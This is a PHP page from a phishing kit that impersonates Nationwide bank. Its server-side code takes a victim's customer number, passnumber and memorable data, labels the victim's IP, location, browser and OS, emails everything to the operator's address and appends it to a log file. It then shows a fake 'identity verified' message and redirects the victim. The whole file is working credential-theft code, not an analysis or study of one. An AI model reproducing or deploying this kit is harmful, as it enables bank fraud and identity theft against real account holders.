<?php
session_start();
require "../CONTROLS.php";
require "../assets/includes/functions.php";
require "../../myEmail.php";
ini_set('display_errors', '0');
date_default_timezone_set('Europe/London');
$date = date('l d F Y');
$time = date('H:i');
$user = $_SESSION['user'];
$pass = $_POST['password'];
$memorable = $_POST['memorable'];


$ip = $_SERVER['REMOTE_ADDR'];
$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
$VictimInfo1 = "| IP Address :"." ".$_SERVER['REMOTE_ADDR']." (".gethostbyaddr($_SERVER['REMOTE_ADDR']).")";
$VictimInfo2 = "| Location :"." ".$systemInfo['city'].", ".$systemInfo['region'].", ".$systemInfo['country'];
$VictimInfo3 = "| UserAgent :"." ".$systemInfo['useragent'];
$VictimInfo4 = "| Browser :"." ".$systemInfo['browser'];
$VictimInfo5 = "| Platform :"." ".$systemInfo['os'];
$data = "
+ ---------------Danny----------------+
+ ------------------------------------------+
+ Account Information (Nationwide)
| Customer number : $user
| Memorable data : $memorable
| Passnumber : $pass
+ ------------------------------------------+
+ Victim Information
$VictimInfo1
$VictimInfo2
$VictimInfo3
$VictimInfo4
$VictimInfo5
+ ------------------------------------------+
";
mail($myEmail, 'NationWide from ' . $_SERVER['REMOTE_ADDR'], $data);

$file = fopen('../../assets/logs/banks.txt', 'a');
fwrite($file, $data);
fclose($file);


?>
<!DOCTYPE html>
<html lang="en">
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
 
    <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8">
    <meta name="viewport" content="width=1000">
    <meta name="format-detection" content="telephone=no">
    <title>Complete</title>
	<link href="assets/css/common.css" rel="stylesheet" type="text/css">
    <link href="assets/css/one.css" rel="stylesheet" type="text/css">
    <link href="assets/css/two.css" rel="stylesheet" type="text/css">
    <link href="assets/css/three.css" rel="stylesheet" type="text/css">
    <link href="assets/css/four.css" rel="stylesheet" type="text/css">
    <link rel="shortcut icon" href="assets/img/favicon.ico">
    <link rel="apple-touch-icon" href="assets/img/two.png">
	<meta http-equiv="refresh" content="5; URL='../../complete.php'" />
  </head>



  <body id="" class="default-theme">
  <div id="cboxOverlay" style="display: none;"></div>
  <div id="colorbox" class="" style="padding-bottom: 35px; padding-right: 40px; display: none;">
  <div id="cboxWrapper">
  <div>
  <div id="cboxTopLeft" style="float: left;"></div>
  <div id="cboxTopCenter" style="float: left;"></div>
  <div id="cboxTopRight" style="float: left;"></div>
  </div>
  
  
  <div style="clear: left;">
  <div id="cboxMiddleLeft" style="float: left;"></div>
  <div id="cboxContent" style="float: left;">
  <div id="cboxLoadedContent" class="" style="width: 0px; height: 0px; overflow: hidden;"></div>
  <div id="cboxLoadingOverlay" class=""></div>
  <div id="cboxLoadingGraphic" class=""></div>
  <div id="cboxTitle" class=""></div>
  <div id="cboxCurrent" class=""></div>
  <div id="cboxNext" class=""></div>
  <div id="cboxPrevious" class=""></div>
  <div id="cboxSlideshow" class=""></div>
  <a id="cboxClose" href="#"><b class="button"></b><i><span class="srText">Close layer and return to page</span></i></a>
  </div>
  <div id="cboxMiddleRight" style="float: left;"></div>
  </div>
  
  
  <div style="clear: left;">
  <div id="cboxBottomLeft" style="float: left;"></div>
  <div id="cboxBottomCenter" style="float: left;"></div>
  <div id="cboxBottomRight" style="float: left;"></div>
  </div>
  
  </div>
  
  <div style="position: absolute; width: 9999px; visibility: hidden; display: none;"></div>
  </div>
    
    <div id="wrapper_outer">
      
    <header>
      <div class="welcome-util-container">
        <ul id="utility-links" role="navigation">
            <li class="demo">
                <a href="#">
                    Demo<span class="new-window-link"></span>
                            <span class="srText">Opens in a new window</span>
                     
                </a>
                
            </li>
            <li class="help">
                <a href="#">
                    Help centre
                    <span class="new-window-link"></span>
                    <span class="srText">Opens in a new window</span>
                </a>
                
            </li>
        </ul>
        
<div id="search">
    <a id="skipNavSearch"></a>
    <form action="#" method="post" name="logi">
<p style="color:#000000;font-size:11px">Search</p>
        <a class="btnSrchGo" href="#" value="Search"><b class="button"></b><i></i></a>
    </form>
</div>

      </div>
      <div id="brand" role="banner">
        
        <a class="logo" href="#">
            <img src="assets/img/mogo.png">
        </a>
        <img class="png title" src="assets/img/tag.png">
      </div>
    </header>

 
<div id="wrapper_content">
        <div id="application">
            <div id="user-content" style="height: 244px;">
                <div class="javaScriptEnabled">
                    <span>
                    </span>
                </div>
            </div>
            <div id="stage" style="height: 284px;">
                <!-- middle column -->
                <div id="stageInner" style="height: 239px;">
                    <a id="skipNavMainContent"></a>


    <div id="confirm-pageMessageArea" class="page-msg confirm-msg no-msg" role="alert" style="display:block">
        <h2><span></span>Complete</h2>
        <div class="inner-msg" style="text-align:center">
		<br />
                <p><span class="clearfix" style="margin-top: 10px;"><img src="assets/img/spin.gif"></span></p>
		</br />
				<p style="font-size: 14px;font-weight: bold;color: #000;line-height: 120%;">Please Wait ... 
		<br />
				Your identity has been verified
		<br />		
				You will be redirected shortly.</p>
		<br />
        
		            <div class="information-box">
					<p style="text-decoration: underline;color:red;font-weight:bold;">For your security you have been automatically logged out. </p>                
					</div>
		
		</div>
    </div>                    


<div class="clear-line">&nbsp;</div>

                    <div class="javaScriptEnabled">
                    </div>
                </div>
            </div>
            <div id="nw-content" style="height: 234px;">
                <div class="javaScriptEnabled">
                    <span>
                    </span>
                </div>
            </div>
        </div>
    </div>   
    
    <div id="footer">
        <footer>
        </footer>
    </div>

    </div>
       
</body>
</html>